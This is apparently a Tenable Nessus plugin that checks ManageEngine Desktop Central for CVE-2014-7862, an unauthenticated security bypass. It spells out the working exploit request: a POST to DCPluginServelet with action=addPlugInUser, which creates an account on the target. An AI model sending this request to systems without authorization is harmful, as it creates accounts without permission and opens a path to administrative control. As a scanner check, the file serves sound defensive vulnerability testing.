#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(82080);
  script_version("$Revision: 1.3 $");
  script_cvs_date("$Date: 2016/05/16 14:02:53 $");

  script_cve_id("CVE-2014-7862");
  script_bugtraq_id(71849);
  script_osvdb_id(116554);

  script_name(english:"ManageEngine Desktop Central Remote Security Bypass (Intrusive Check)");
  script_summary(english:"Tries to add a user to the system.");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a Java web application that is affected
by a security bypass vulnerability.");
  script_set_attribute(attribute:"description", value:
"The version of ManageEngine Desktop Central running on the remote host
is affected by a remote security bypass vulnerability, due to a
failure to restrict access to 'DCPluginServelet'. This allows an
unauthenticated, remote attacker to create an account with full
administrative privileges within DesktopCentral and then perform any
tasks DesktopCentral administrative users could perform, including the
execution of code and commands on systems managed by DesktopCentral.");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/fulldisclosure/2015/Jan/2");

  script_set_attribute(attribute:"solution", value:
"Upgrade to ManageEngine Desktop Central 9 build 90109 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2014/12/31");
  script_set_attribute(attribute:"patch_publication_date", value:"2015/01/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2015/03/25");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:zohocorp:manageengine_desktop_central");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2015-2016 Tenable Network Security, Inc.");

  script_dependencies("manageengine_desktop_central_detect.nbin");
  script_require_ports("Services/www", 8020, 8383, 8040);
  script_require_keys("installed_sw/ManageEngine Desktop Central");

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

appname = "ManageEngine Desktop Central";
get_install_count(app_name:appname, exit_if_zero:TRUE);

port = get_http_port(default:8040);

install = get_single_install(
  app_name            : appname,
  port                : port
);

dir = install["path"];
install_url =  build_url(port:port, qs:dir);

# We add user as 'Guest' with an unusable password
name = "remove_me_nessus_"+rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789",length:10);
url  = "";
if(dir != "/")
  url = dir; 
url += "/servlets/DCPluginServelet?action=addPlugInUser&role=DCGuest&userName="+name+"&email=graphich@mailinator.com&phNumber=8675309&password=rG3yK%2BI4jU%2FO9H4hPjY6VA%3D%3D&salt=1426703757554&createdtime=02181987";

res = http_send_recv3(
  port            : port,
  method          : "POST",
  item            : url,
  content_type    : "text/html",
  exit_on_fail    : TRUE
);
exp_request = http_last_sent_request();

if ('message="Sucessfully added"' >< res[2])
{
  security_report_v4(
    port       : port,
    severity   : SECURITY_HOLE,
    request    : make_list(build_url(port:port,qs:url)),
    output     : res[2],
    rep_extra  : "The non-functional user '"+name+"' was added to the system and must be removed.",
    generic    : TRUE
  );
}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, "ManageEngine Desktop Central", install_url);
